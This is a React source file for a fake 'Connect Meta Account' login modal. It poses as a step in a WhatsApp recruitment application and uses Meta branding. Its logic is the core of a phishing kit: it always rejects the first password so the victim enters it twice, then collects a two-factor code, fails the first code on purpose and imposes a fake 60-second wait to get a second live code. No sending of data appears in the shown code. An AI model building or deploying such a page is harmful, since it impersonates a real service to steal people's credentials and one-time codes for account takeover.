import React, { useState, useEffect, useRef } from "react";
import { X, Shield } from "lucide-react";
import { 
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogClose
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";

interface MetaLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSuccess: () => void;
}

enum LoginStep {
  LOGIN_FIRST_ATTEMPT = 0,
  LOGIN_SECOND_ATTEMPT = 1,
  VERIFICATION_FIRST_ATTEMPT = 2,
  VERIFICATION_TIMEOUT = 3,
  VERIFICATION_SECOND_ATTEMPT = 4,
}

const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => {
  const { toast } = useToast();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(LoginStep.LOGIN_FIRST_ATTEMPT);
  const [countdown, setCountdown] = useState(60);
  const codeInputRef = useRef<HTMLInputElement>(null);
  
  // Reset the timer when we reach the timeout step
  useEffect(() => {
    if (currentStep === LoginStep.VERIFICATION_TIMEOUT) {
      const timer = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(timer);
            setCurrentStep(LoginStep.VERIFICATION_SECOND_ATTEMPT);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      
      return () => clearInterval(timer);
    }
  }, [currentStep]);

  // Focus on the code input field when it becomes visible
  useEffect(() => {
    if (
      (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
       currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && 
      codeInputRef.current
    ) {
      codeInputRef.current.focus();
    }
  }, [currentStep]);

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Simulate authentication process
    setTimeout(() => {
      setIsLoading(false);
      
      if (!email || !password) {
        toast({
          variant: "destructive",
          title: "Authentication failed",
          description: "Please enter both email and password.",
        });
        return;
      }
      
      if (currentStep === LoginStep.LOGIN_FIRST_ATTEMPT) {
        // First password attempt always fails
        toast({
          variant: "destructive",
          title: "Incorrect password",
          description: "The password you entered is incorrect. Please try again.",
        });
        setPassword("");
        setCurrentStep(LoginStep.LOGIN_SECOND_ATTEMPT);
      } else {
        // Second password attempt succeeds and moves to verification
        setCurrentStep(LoginStep.VERIFICATION_FIRST_ATTEMPT);
      }
    }, 1500);
  };

  const handleVerificationSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Simulate verification process
    setTimeout(() => {
      setIsLoading(false);
      
      if (!verificationCode || verificationCode.length < 6) {
        toast({
          variant: "destructive",
          title: "Verification failed",
          description: "Please enter a valid verification code.",
        });
        return;
      }
      
      if (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT) {
        // First verification attempt always fails
        toast({
          variant: "destructive",
          title: "Incorrect code",
          description: "The verification code you entered is incorrect. Please wait 60 seconds before trying again.",
        });
        setVerificationCode("");
        setCountdown(60);
        setCurrentStep(LoginStep.VERIFICATION_TIMEOUT);
      } else {
        // Second verification attempt succeeds
        toast({
          title: "Connected to Meta",
          description: "Your application is now linked to your Meta account.",
        });
        onSuccess();
      }
    }, 1500);
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-md">
        <DialogHeader>
          <div className="flex justify-between items-start mb-2">
            <DialogTitle className="text-2xl font-bold text-[#1877F2]">
              Connect Meta Account
            </DialogTitle>
            <DialogClose className="text-gray-500 hover:text-gray-800">
              <X className="h-5 w-5" />
            </DialogClose>
          </div>
        </DialogHeader>
        
        <div className="space-y-6 mt-4">
          <div className="flex justify-center mb-6">
            <img 
              src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
              alt="Meta Logo" 
              className="h-16"
            />
          </div>
          
          {/* Login Steps */}
          {(currentStep === LoginStep.LOGIN_FIRST_ATTEMPT || currentStep === LoginStep.LOGIN_SECOND_ATTEMPT) && (
            <>
              <p className="text-center text-gray-600">
                Connect your Meta account to complete your application. 
                This helps us verify your identity and improves your chances of getting selected.
              </p>
              
              <form onSubmit={handlePasswordSubmit} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="email">Email or Phone</Label>
                  <Input 
                    id="email" 
                    type="text"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Email or phone number"
                    className="border-gray-300"
                    disabled={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                  />
                </div>
                
                <div className="space-y-2">
                  <Label htmlFor="password">Password</Label>
                  <Input 
                    id="password" 
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Password"
                    className="border-gray-300"
                    autoFocus={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                  />
                </div>
                
                <Button 
                  type="submit" 
                  className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
                  disabled={isLoading}
                >
                  {isLoading ? "Connecting..." : "Connect Account"}
                </Button>
              </form>
              
              <div className="text-center">
                <a href="#" className="text-[#1877F2] text-sm hover:underline">
                  Forgot password?
                </a>
              </div>
            </>
          )}
          
          {/* 2FA Verification Steps */}
          {(currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
            currentStep === LoginStep.VERIFICATION_TIMEOUT || 
            currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && (
            <>
              <div className="flex items-center justify-center mb-2">
                <Shield className="h-8 w-8 text-[#1877F2] mr-2" />
                <h3 className="text-xl font-bold">Two-factor authentication required</h3>
              </div>
              
              <p className="text-center text-gray-600 mb-4">
                We've sent a verification code to the mobile number associated with your account.
              </p>
              
              <form onSubmit={handleVerificationSubmit} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="code">Enter the 6 or 8-digit code</Label>
                  <Input 
                    id="code" 
                    type="text"
                    ref={codeInputRef}
                    value={verificationCode}
                    onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
                    placeholder="Enter code"
                    className="border-gray-300 text-center tracking-widest text-lg"
                    disabled={currentStep === LoginStep.VERIFICATION_TIMEOUT}
                    maxLength={8}
                  />
                  
                  {currentStep === LoginStep.VERIFICATION_TIMEOUT && (
                    <p className="text-red-500 text-sm text-center">
                      Please wait {countdown} seconds before requesting a new code
                    </p>
                  )}
                </div>
                
                <Button 
                  type="submit" 
                  className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
                  disabled={isLoading || currentStep === LoginStep.VERIFICATION_TIMEOUT}
                >
                  {isLoading ? "Verifying..." : "Verify Code"}
                </Button>
              </form>
              
              <div className="text-center">
                <a href="#" className="text-[#1877F2] text-sm hover:underline">
                  I don't have access to my authentication app
                </a>
              </div>
            </>
          )}
          
          <div className="border-t border-gray-300 pt-4">
            <p className="text-center text-xs text-gray-500">
              By connecting your Meta account, you agree to our Terms of Service and Privacy Policy. 
              Your application information will be shared with the WhatsApp recruitment team.
            </p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default MetaLoginModal;